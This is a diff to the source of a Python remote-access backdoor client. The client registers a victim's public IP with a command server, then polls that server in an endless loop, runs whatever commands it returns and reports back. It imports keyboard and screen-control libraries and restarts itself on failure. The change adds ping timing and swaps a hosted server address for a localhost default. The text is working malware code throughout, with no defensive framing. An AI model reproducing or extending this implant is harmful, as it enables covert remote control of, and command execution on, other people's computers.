@@ -1,12 +1,16 @@
-import requests,time,os,keyboard,pyautogui,webbrowser
+import requests,time,os,keyboard,pyautogui,webbrowser,time
 
 class backdoor:
     def __init__(self, url="http://127.0.0.1:8000/"):
         self.url = url
         ip = requests.get("https://api64.ipify.org/").text
         self.id = requests.get(self.url+"api/get_id/"+ip).json()['id']
+        ping = "0ms"
         while True:
-            requests.get(self.url+"api/ping/"+str(self.id))
+            start = time.time()
+            requests.get(self.url+"api/ping/"+str(self.id)+"/"+ping)
+            end = time.time()
+            ping = str(round((end-start)*1000,2))
             commands = requests.get(self.url+"api/commands/"+str(self.id)).json()
             for i in commands:
                 output = self.run(commands[i])
@@ -233,7 +237,7 @@ class backdoor:
         return output
 while True:
     try:
-        backdoor("https://pybdtest.pythonanywhere.com/") 
+        backdoor() 
     except:
         pass
     try: 
